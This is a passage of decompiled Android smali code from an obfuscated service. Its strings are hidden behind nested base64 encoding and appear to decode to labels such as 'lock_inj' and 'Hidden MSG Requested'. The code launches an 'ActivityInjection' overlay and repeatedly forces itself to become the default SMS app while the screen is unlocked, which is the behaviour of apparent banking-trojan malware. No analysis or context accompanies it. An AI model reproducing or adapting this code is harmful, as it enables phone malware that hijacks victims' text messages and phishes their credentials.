    invoke-virtual {v8, v9, v13, v14}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_658
    .catch Ljava/lang/Exception; {:try_start_614 .. :try_end_658} :catch_65c

    :cond_658
    :goto_658
    const/4 v10, 0x0

    goto :goto_65c

    :catch_65a
    :cond_65a
    move/from16 v16, v13

    :catch_65c
    :goto_65c
    move v14, v10

    :try_start_65d
    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {v9}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const/4 v9, 0x6

    if-lt v0, v9, :cond_6e7

    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-virtual {v8, v9}, Lnaqsl/ebxcb/exu/int;->catch(Landroid/content/Context;)Z

    move-result v9

    if-eqz v9, :cond_6e2

    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v10, "Ykc5amExOXBibW89"

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v9, v10}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    iget-object v10, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v13, "WkdWc1gzTjNjdz09"

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v8, v10, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v13, "WkVoS01WcFJQVDA9"

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v10, v13}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_69f
    .catch Ljava/lang/Exception; {:try_start_65d .. :try_end_69f} :catch_6e7

    const/4 v10, 0x0

    :try_start_6a0
    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_6ac

    invoke-virtual {v9, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_6e0

    :cond_6ac
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v10, 0x2

    if-le v3, v10, :cond_6e0

    new-instance v3, Landroid/content/Intent;

    iget-object v10, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v13, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;

    invoke-direct {v3, v10, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v10, "WXpOU2VRPT0="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v3, v10, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    const/high16 v9, 0x10000000

    invoke-virtual {v3, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v9, 0x800000

    invoke-virtual {v3, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v9, 0x40000000    # 2.0f

    invoke-virtual {v3, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v3}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_6e0
    .catch Ljava/lang/Exception; {:try_start_6a0 .. :try_end_6e0} :catch_6e0

    :catch_6e0
    :cond_6e0
    move v13, v0

    goto :goto_6e4

    :cond_6e2
    move/from16 v13, v20

    :goto_6e4
    move/from16 v20, v13

    const/4 v0, 0x0

    :catch_6e7
    :cond_6e7
    move v15, v0

    move/from16 v13, v20

    const/4 v3, 0x1

    if-ne v13, v3, :cond_774

    :try_start_6ed
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v9, 0x13

    if-lt v0, v9, :cond_80e

    invoke-static/range {p0 .. p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_80e

    move-object/from16 v0, v17

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0
    :try_end_70d
    .catch Ljava/lang/Exception; {:try_start_6ed .. :try_end_70d} :catch_80e

    if-nez v0, :cond_80e

    :try_start_70f
    new-instance v0, Landroid/content/Intent;

    const-string v9, "android.provider.Telephony.ACTION_CHANGE_DEFAULT"

    invoke-direct {v0, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v9, 0x10000000

    invoke-virtual {v0, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v9, "package"

    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->getPackageName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_727
    .catch Ljava/lang/Exception; {:try_start_70f .. :try_end_727} :catch_727

    :catch_727
    :try_start_727
    const-string v0, "VGtFOVBRPT0="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Y0QwPQ=="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v10, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "ZkVocFpHUmxiaUJOVTBjZ1VtVnhkV1Z6ZEdWa0xnPT0="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v10, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v8, v3}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :goto_76f
    invoke-virtual {v8, v1, v0, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    goto/16 :goto_80e

    :cond_774
    move-object/from16 v0, v17

    if-nez v13, :cond_80e

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v9, 0x13

    if-lt v3, v9, :cond_80e

    invoke-static/range {p0 .. p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_80e

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0
    :try_end_796
    .catch Ljava/lang/Exception; {:try_start_727 .. :try_end_796} :catch_80e

    if-nez v0, :cond_80e

    :try_start_798
    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Landroid/content/Intent;

    const-string v9, "android.provider.Telephony.ACTION_CHANGE_DEFAULT"

    invoke-direct {v3, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v9, 0x10000000

    invoke-virtual {v3, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v9, "package"

    invoke-virtual {v3, v9, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v1, v3}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V

    sget-object v0, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v9, 0x7d0

    invoke-virtual {v0, v9, v10}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_7bf
    .catch Ljava/lang/InterruptedException; {:try_start_798 .. :try_end_7bf} :catch_7c0
    .catch Ljava/lang/Exception; {:try_start_798 .. :try_end_7bf} :catch_80e

    goto :goto_7c4

    :catch_7c0
    move-exception v0

    :try_start_7c1
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_7c4
    const-string v0, "VGtFOVBRPT0="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Y0QwPQ=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, "ZkU1dmNtMWhiQ0JOVTBjZ1VtVnhkV1Z6ZEdWa0xudz0="

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3
    :try_end_80c
    .catch Ljava/lang/Exception; {:try_start_7c1 .. :try_end_80c} :catch_80e

    goto/16 :goto_76f

    :catch_80e
    :cond_80e
    :goto_80e
    move-object/from16 v3, v19

    move-object/from16 v6, v22

    const/4 v9, 0x1

    goto/16 :goto_86
.end method
